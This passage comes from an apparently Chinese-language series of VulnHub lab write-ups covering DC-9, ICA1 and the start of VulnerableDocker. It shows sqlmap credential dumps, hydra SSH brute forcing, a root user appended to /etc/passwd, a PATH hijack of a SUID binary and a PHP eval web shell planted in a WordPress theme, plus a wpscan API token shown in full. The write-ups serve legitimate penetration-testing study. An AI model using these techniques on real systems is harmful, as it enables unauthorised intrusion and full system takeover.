</span></span></code></pre></div><p>通过sqlmap获取用户信息爆破ssh：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>python sqlmap.py -r sql.txt -dbs --batch
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>10</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>25</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>59</span>] [<span style=color:#66d9ef>INFO</span>] fetching database names
</span></span><span style=display:flex><span>available databases [<span style=color:#ae81ff>3</span>]<span style=color:#960050;background-color:#1e0010>:</span>
</span></span><span style=display:flex><span>[*] information_schema
</span></span><span style=display:flex><span>[*] Staff
</span></span><span style=display:flex><span>[*] users
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>python sqlmap.py -r sql.txt -D users -T UserDetails --columns --batch
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>10</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>31</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>11</span>] [<span style=color:#66d9ef>INFO</span>] fetching columns <span style=color:#66d9ef>for</span> table <span style=color:#e6db74>&#39;UserDetails&#39;</span> <span style=color:#66d9ef>in</span> database <span style=color:#e6db74>&#39;users&#39;</span>
</span></span><span style=display:flex><span>Database<span style=color:#960050;background-color:#1e0010>:</span> users
</span></span><span style=display:flex><span>Table<span style=color:#960050;background-color:#1e0010>:</span> UserDetails
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>6</span> columns]
</span></span><span style=display:flex><span>+-----------+-----------------+
</span></span><span style=display:flex><span>| Column    | Type            |
</span></span><span style=display:flex><span>+-----------+-----------------+
</span></span><span style=display:flex><span>| firstname | varchar(<span style=color:#ae81ff>30</span>)     |
</span></span><span style=display:flex><span>| id        | int(<span style=color:#ae81ff>6</span>) unsigned |
</span></span><span style=display:flex><span>| lastname  | varchar(<span style=color:#ae81ff>30</span>)     |
</span></span><span style=display:flex><span>| password  | varchar(<span style=color:#ae81ff>20</span>)     |
</span></span><span style=display:flex><span>| reg_date  | timestamp       |
</span></span><span style=display:flex><span>| username  | varchar(<span style=color:#ae81ff>30</span>)     |
</span></span><span style=display:flex><span>+-----------+-----------------+
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>python sqlmap.py -r sql.txt -D users -T UserDetails -C username,password --dump --batch
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>10</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>32</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>27</span>] [<span style=color:#66d9ef>INFO</span>] fetching entries of column(s) <span style=color:#e6db74>&#39;password,username&#39;</span> <span style=color:#66d9ef>for</span> table <span style=color:#e6db74>&#39;UserDetails&#39;</span> <span style=color:#66d9ef>in</span> database <span style=color:#e6db74>&#39;users&#39;</span>
</span></span><span style=display:flex><span>Database<span style=color:#960050;background-color:#1e0010>:</span> users
</span></span><span style=display:flex><span>Table<span style=color:#960050;background-color:#1e0010>:</span> UserDetails
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>17</span> entries]
</span></span><span style=display:flex><span>+-----------+---------------+
</span></span><span style=display:flex><span>| username  | password      |
</span></span><span style=display:flex><span>+-----------+---------------+
</span></span><span style=display:flex><span>| marym     | 3kfs86sfd     |
</span></span><span style=display:flex><span>| julied    | 468sfdfsd2    |
</span></span><span style=display:flex><span>| fredf     | 4sfd87sfd1    |
</span></span><span style=display:flex><span>| barneyr   | RocksOff      |
</span></span><span style=display:flex><span>| tomc      | TC&amp;TheBoyz    |
</span></span><span style=display:flex><span>| jerrym    | B8m<span style=color:#75715e>#48sd      |</span>
</span></span><span style=display:flex><span>| wilmaf    | Pebbles       |
</span></span><span style=display:flex><span>| bettyr    | BamBam01      |
</span></span><span style=display:flex><span>| chandlerb | UrAG0D!       |
</span></span><span style=display:flex><span>| joeyt     | Passw0rd      |
</span></span><span style=display:flex><span>| rachelg   | yN72<span style=color:#75715e>#dsd      |</span>
</span></span><span style=display:flex><span>| rossg     | ILoveRachel   |
</span></span><span style=display:flex><span>| monicag   | 3248dsds7s    |
</span></span><span style=display:flex><span>| phoebeb   | smellycats    |
</span></span><span style=display:flex><span>| scoots    | YR3BVxxxw87   |
</span></span><span style=display:flex><span>| janitor   | Ilovepeepee   |
</span></span><span style=display:flex><span>| janitor2  | Hawaii-Five-<span style=color:#ae81ff>0</span> |
</span></span><span style=display:flex><span>+-----------+---------------+
</span></span></code></pre></div><p>hydra爆破ssh：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ hydra -L username.txt -P passwords.txt ssh://61.139.2.139 -vV -s <span style=color:#ae81ff>22</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>22<span style=color:#f92672>][</span>ssh<span style=color:#f92672>]</span> host: 61.139.2.139   login: chandlerb   password: UrAG0D!
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>22<span style=color:#f92672>][</span>ssh<span style=color:#f92672>]</span> host: 61.139.2.139   login: joeyt   password: Passw0rd
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>22<span style=color:#f92672>][</span>ssh<span style=color:#f92672>]</span> host: 61.139.2.139   login: janitor   password: Ilovepeepee
</span></span></code></pre></div><p>janitor目录下存在新的密码字典，再爆破一次ssh：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>janitor@dc-9:~$ cat .secrets-for-putin/passwords-found-on-post-it-notes.txt
</span></span><span style=display:flex><span>BamBam01
</span></span><span style=display:flex><span>Passw0rd
</span></span><span style=display:flex><span>smellycats
</span></span><span style=display:flex><span>P0Lic#10-4
</span></span><span style=display:flex><span>B4-Tru3-001
</span></span><span style=display:flex><span>4uGU5T-NiGHts
</span></span></code></pre></div><p>新的用户fredf：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ hydra -L username.txt -P passwords.txt ssh://61.139.2.139 -vV -s <span style=color:#ae81ff>22</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>22<span style=color:#f92672>][</span>ssh<span style=color:#f92672>]</span> host: 61.139.2.139   login: fredf   password: B4-Tru3-001
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>22<span style=color:#f92672>][</span>ssh<span style=color:#f92672>]</span> host: 61.139.2.139   login: joeyt   password: Passw0rd
</span></span></code></pre></div><p><code>sudo -l</code>找到root权限可执行文件：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>fredf@dc-9:~$ sudo -l
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> fredf on dc-9:
</span></span><span style=display:flex><span>    env_reset, mail_badpass, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User fredf may run the following commands on dc-9:
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /opt/devstuff/dist/test/test
</span></span></code></pre></div><p>/opt/devstuff/test.py：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/python</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> len (sys<span style=color:#f92672>.</span>argv) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>3</span> :
</span></span><span style=display:flex><span>    print (<span style=color:#e6db74>&#34;Usage: python test.py read append&#34;</span>)
</span></span><span style=display:flex><span>    sys<span style=color:#f92672>.</span>exit (<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span> :
</span></span><span style=display:flex><span>    f <span style=color:#f92672>=</span> open(sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>], <span style=color:#e6db74>&#34;r&#34;</span>)
</span></span><span style=display:flex><span>    output <span style=color:#f92672>=</span> (f<span style=color:#f92672>.</span>read())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    f <span style=color:#f92672>=</span> open(sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>2</span>], <span style=color:#e6db74>&#34;a&#34;</span>)
</span></span><span style=display:flex><span>    f<span style=color:#f92672>.</span>write(output)
</span></span><span style=display:flex><span>    f<span style=color:#f92672>.</span>close()
</span></span></code></pre></div><p><code>/etc/passwd</code>提权，向其中写入新用户即可提权：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>python -c <span style=color:#e6db74>&#39;import crypt; print crypt.crypt(&#34;123456&#34;, &#34;$6$salt&#34;)&#39;</span>
</span></span><span style=display:flex><span>$6$salt$MktMKPZJ6t59GfxcJU20DwcwQzfMvOlHFVZiOVD71w.igcOo1R7vBYR65JquIQ/7siC7VRpmteKvZmfSkNc69.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#39;hacker:$6$salt$MktMKPZJ6t59GfxcJU20DwcwQzfMvOlHFVZiOVD71w.igcOo1R7vBYR65JquIQ/7siC7VRpmteKvZmfSkNc69.:0:0:root:/root:/bin/bash&#39;</span> &gt;&gt; /etc/passwd
</span></span></code></pre></div><p>theflag.txt：</p><pre tabindex=0><code>███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
                                                                             
Congratulations - you have done well to get to this point.

Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
who have taken the time to complete the various DC challenges.

I also want to send out a big thank you to the various members of @m0tl3ycr3w .

They are an inspirational bunch of fellows.

Sure, they might smell a bit, but...just kidding.  :-)

Sadly, all things must come to an end, and this will be the last ever
challenge in the DC series.

So long, and thanks for all the fish.
</code></pre><p>参考资料：</p><p><a href=https://wiki.archlinux.org.cn/title/Port_knocking>https://wiki.archlinux.org.cn/title/Port_knocking</a></p><h2 id=vulnhub-ica1>vulnhub ICA1<a hidden class=anchor aria-hidden=true href=#vulnhub-ica1>#</a></h2><p>先配置一下网络，NAT模式，初始化界面按e进入编辑模式，将 ro（只读）修改为 rw（读写），并且在参数末尾添加<code>single init=/bin/bash</code>，使其进入单用户模式，再按下<code>ctrl+x</code>重启，<code>ip a</code>查看网卡，发现是ens33进入网络配置文件进行修改：<code>vim /etc/network/interfaces</code>，将ep0s17改为ens33，最后再次重启完成配置</p><p>nmap扫描开放端口及服务：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ nmap 61.139.2.0/24
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 61.139.2.134
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00052s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>997</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE
</span></span><span style=display:flex><span>22/tcp   open  ssh
</span></span><span style=display:flex><span>80/tcp   open  http
</span></span><span style=display:flex><span>3306/tcp open  mysql
</span></span></code></pre></div><p>访问web服务：</p><p><img alt=alt loading=lazy src=/images/vulnhub/2.png></p><p>qdPM9.2，搜索一下对应版本漏洞，发现存在敏感信息泄露的问题：https://www.exploit-db.com/exploits/50176</p><p>访问<code>http://127.0.0.1:8085/core/config/databases.yml</code>，获取数据库配置yml文件：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yml data-lang=yml><span style=display:flex><span><span style=color:#f92672>all</span>:
</span></span><span style=display:flex><span>  <span style=color:#f92672>doctrine</span>:
</span></span><span style=display:flex><span>    <span style=color:#f92672>class</span>: <span style=color:#ae81ff>sfDoctrineDatabase</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>param</span>:
</span></span><span style=display:flex><span>      <span style=color:#f92672>dsn</span>: <span style=color:#e6db74>&#39;mysql:dbname=qdpm;host=localhost&#39;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>profiler</span>: <span style=color:#66d9ef>false</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>username</span>: <span style=color:#ae81ff>qdpmadmin</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>password</span>: <span style=color:#e6db74>&#34;&lt;?php echo urlencode(&#39;UcVQCMQk2STVeS6J&#39;) ; ?&gt;&#34;</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>attributes</span>:
</span></span><span style=display:flex><span>        <span style=color:#f92672>quote_identifier</span>: <span style=color:#66d9ef>true</span>  
</span></span></code></pre></div><p>mysql远程连接到qdpadmin用户：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ mysql -u qdpmadmin -h 61.139.2.134 -p
</span></span><span style=display:flex><span>Enter password: UcVQCMQk2STVeS6J
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Welcome to the MariaDB monitor.  Commands end with ; or <span style=color:#ae81ff>\g</span>.
</span></span><span style=display:flex><span>Your MySQL connection id is <span style=color:#ae81ff>13</span>
</span></span><span style=display:flex><span>Server version: 8.0.26 MySQL Community Server - GPL
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Copyright <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Type <span style=color:#e6db74>&#39;help;&#39;</span> or <span style=color:#e6db74>&#39;\h&#39;</span> <span style=color:#66d9ef>for</span> help. Type <span style=color:#e6db74>&#39;\c&#39;</span> to clear the current input statement.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>MySQL <span style=color:#f92672>[(</span>none<span style=color:#f92672>)]</span>&gt; 
</span></span></code></pre></div><p>获取数据库敏感信息：</p><pre tabindex=0><code>show databases;
use staff;
show tables;
select * from user;
+------+---------------+--------+---------------------------+
| id   | department_id | name   | role                      |
+------+---------------+--------+---------------------------+
|    1 |             1 | Smith  | Cyber Security Specialist |
|    2 |             2 | Lucas  | Computer Engineer         |
|    3 |             1 | Travis | Intelligence Specialist   |
|    4 |             1 | Dexter | Cyber Security Analyst    |
|    5 |             2 | Meyer  | Genetic Engineer          |
+------+---------------+--------+---------------------------+

select * from login;

+------+---------+--------------------------+
| id   | user_id | password                 |
+------+---------+--------------------------+
|    1 |       2 | c3VSSkFkR3dMcDhkeTNyRg== |
|    2 |       4 | N1p3VjRxdGc0MmNtVVhHWA== |
|    3 |       1 | WDdNUWtQM1cyOWZld0hkQw== |
|    4 |       3 | REpjZVZ5OThXMjhZN3dMZw== |
|    5 |       5 | Y3FObkJXQ0J5UzJEdUpTeQ== |
+------+---------+--------------------------+
</code></pre><p>password先base64解码再填入passwords.txt中，将数据库中的用户名以及将首字母改写为小写后的所有用户名写入username.txt中，进行ssh爆破：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#f92672>[</span>22<span style=color:#f92672>][</span>ssh<span style=color:#f92672>]</span> host: 61.139.2.134   login: travis   password: DJceVy98W28Y7wLg
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>22<span style=color:#f92672>][</span>ssh<span style=color:#f92672>]</span> host: 61.139.2.134   login: dexter   password: 7ZwV4qtg42cmUXGX
</span></span></code></pre></div><p>ssh登录dexter用户：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ ssh dexter@61.139.2.134 -p <span style=color:#ae81ff>22</span>
</span></span><span style=display:flex><span>dexter@61.139.2.134<span style=color:#960050;background-color:#1e0010>&#39;</span>s password: 
</span></span><span style=display:flex><span>Linux debian 5.10.0-8-amd64 <span style=color:#75715e>#1 SMP Debian 5.10.46-5 (2021-09-23) x86_64</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>The programs included with the Debian GNU/Linux system are free software;
</span></span><span style=display:flex><span>the exact distribution terms <span style=color:#66d9ef>for</span> each program are described in the
</span></span><span style=display:flex><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span style=display:flex><span>permitted by applicable law.
</span></span><span style=display:flex><span>Last login: Sat Sep <span style=color:#ae81ff>25</span> 08:43:19 <span style=color:#ae81ff>2021</span> from 192.168.1.3
</span></span><span style=display:flex><span>dexter@debian:~$
</span></span></code></pre></div><p><code>/home/dexter</code>目录下note.txt：</p><pre tabindex=0><code>It seems to me that there is a weakness while accessing the system.
As far as I know, the contents of executable files are partially viewable.
I need to find out if there is a vulnerability or not.
</code></pre><p>查找suid权限可执行文件：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ find / -perm -u<span style=color:#f92672>=</span>s -type f 2&gt;/dev/null
</span></span><span style=display:flex><span>/opt/get_access
</span></span><span style=display:flex><span>/usr/bin/chfn
</span></span><span style=display:flex><span>/usr/bin/umount
</span></span><span style=display:flex><span>/usr/bin/gpasswd
</span></span><span style=display:flex><span>/usr/bin/sudo
</span></span><span style=display:flex><span>/usr/bin/passwd
</span></span><span style=display:flex><span>/usr/bin/newgrp
</span></span><span style=display:flex><span>/usr/bin/su
</span></span><span style=display:flex><span>/usr/bin/mount
</span></span><span style=display:flex><span>/usr/bin/chsh
</span></span><span style=display:flex><span>/usr/lib/openssh/ssh-keysign
</span></span><span style=display:flex><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span></code></pre></div><p>可以用<code>scp</code>命令将<code>/opt/get_access</code>传到kali上，再用IDA进行静态分析：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ scp dexter@61.139.2.134:/opt/get_access ./
</span></span></code></pre></div><p>IDA静态分析：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#66d9ef>__fastcall</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>envp)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>setuid</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>setgid</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;cat /root/system.info&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( <span style=color:#a6e22e>socket</span>(<span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> )
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Could not create socket to access to the system.&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;All services are disabled. Accessing to the system is allowed only within working hours.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>看到该suid权限程序执行了<code>cat</code>命令，于是可以尝试临时修改环境变量<code>PATH</code>，使该程序先执行指定目录下的<code>cat</code>文件，实现自定义<code>cat</code>命令实现提权：</p><pre tabindex=0><code>$ echo &#34;/bin/bash&#34; &gt; /tmp/cat
$ export PATH=/tmp:$PATH
$ chmod +x /tmp/cat
$ /usr/get_access
</code></pre><p>获取root目录下的敏感文件：</p><pre tabindex=0><code>root@debian:~# /bin/cat /root/root.txt
ICA{Next_Generation_Self_Renewable_Genetics}
</code></pre><p>发现travis用户目录下也有一份敏感文件：</p><pre tabindex=0><code>root@debian:~# /bin/cat /home/travis/user.txt
ICA{Secret_Project}
</code></pre><h2 id=vulnhub-vulnearbledocker>vulnhub VulnearbleDocker<a hidden class=anchor aria-hidden=true href=#vulnhub-vulnearbledocker>#</a></h2><p>靶机ip: 61.139.2.142</p><p>nmap全端口扫描：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cmd data-lang=cmd><span style=display:flex><span>nmap -p- 61.139.2.142 --min-rate=10000
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-25 22:31 CST
</span></span><span style=display:flex><span>Nmap scan report for 61.139.2.142
</span></span><span style=display:flex><span>Host is up (0.00075s latency).
</span></span><span style=display:flex><span>Not shown: 65533 closed tcp ports (conn-refused)
</span></span><span style=display:flex><span>PORT     STATE SERVICE
</span></span><span style=display:flex><span>22/tcp   open  ssh
</span></span><span style=display:flex><span>8000/tcp open  http-alt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap done: 1 IP address (1 host up) scanned in 14.24 seconds
</span></span></code></pre></div><p>存在22端口的 ssh 服务和8000端口的 wordpress 框架的web服务，wpscan：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>wpscan --url http://61.139.2.142:8000/ --api-token IEMpNIjGQXaJnkgB2X6YREjqcWO5Uq2979maC9WAvi8
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> WordPress version 4.8.1 identified <span style=color:#f92672>(</span>Insecure, released on 2017-08-02<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span> | Found By: Rss Generator <span style=color:#f92672>(</span>Passive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> |  - http://61.139.2.142:8000/feed/, &lt;generator&gt;https://wordpress.org/?v<span style=color:#f92672>=</span>4.8.1&lt;/generator&gt;
</span></span><span style=display:flex><span> |  - http://61.139.2.142:8000/comments/feed/, &lt;generator&gt;https://wordpress.org/?v<span style=color:#f92672>=</span>4.8.1&lt;/generator&gt;
</span></span><span style=display:flex><span> |
</span></span><span style=display:flex><span> | <span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> <span style=color:#ae81ff>89</span> vulnerabilities identified:
</span></span></code></pre></div><p>有89个漏洞，但是没找到合适的，试试枚举用户：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>wpscan --url http://61.139.2.142:8000/ -e u
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> User<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span> Identified:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> bob
</span></span><span style=display:flex><span> | Found By: Author Posts - Author Pattern <span style=color:#f92672>(</span>Passive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> | Confirmed By:
</span></span><span style=display:flex><span> |  Rss Generator <span style=color:#f92672>(</span>Passive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> |  Wp Json Api <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> |   - http://61.139.2.142:8000/wp-json/wp/v2/users/?per_page<span style=color:#f92672>=</span>100&amp;page<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span> |  Rss Generator <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> |  Author Id Brute Forcing - Author Pattern <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> |  Login Error Messages <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>直接爆破bob用户试试：</p><pre tabindex=0><code>wpscan --url http://61.139.2.142:8000/ -U username.txt -P rockyou.txt 

[!] Valid Combinations Found:
 | Username: bob, Password: Welcome1
</code></pre><p>登录后台可以在 posts 找到 flag_1：</p><pre tabindex=0><code>2aa11783d05b6a329ffc4d2a1ce037f46162253e55d53764a6a7e998

good job finding this one. Now Lets hunt for the other flags

hint: they are in files.
</code></pre><p>本来想改plugins的，但是直接访问<code>/wp-content/plugins</code>会报forbidden，后面考虑修改theme，本题环境用的是Twenty Seventeen的主题，直接改里面的footer.php，开头加上一句话木马:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#f92672>@</span><span style=color:#66d9ef>eval</span>($_REQUEST[<span style=color:#ae81ff>1</span>]);
</span></span><span style=display:flex><span><span style=color:#e6db74>/**
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * The template for displaying the footer
</span></span></span><span style=display:flex><span><span style=color:#e6db74> *
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * Contains the closing of the #content div and all content after.
</span></span></span><span style=display:flex><span><span style=color:#e6db74> *
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
</span></span></span><span style=display:flex><span><span style=color:#e6db74> *
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * @package WordPress
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * @subpackage Twenty_Seventeen
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * @since 1.0
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * @version 1.2
</span></span></span><span style=display:flex><span><span style=color:#e6db74> */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>蚁剑连webshell：http://127.0.0.1:8085/wp-content/themes/twentyseventeen/footer.php，用户为 www-data</p><p>根目录下存在<code>.dockerenv</code>，同时<code>/porc/1/cgroup</code>以及 hostname 都存在明显docker特征：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>cat /proc/1/cgroup
</span></span><span style=display:flex><span>11:name<span style=color:#f92672>=</span>systemd:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
</span></span><span style=display:flex><span>10:hugetlb:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
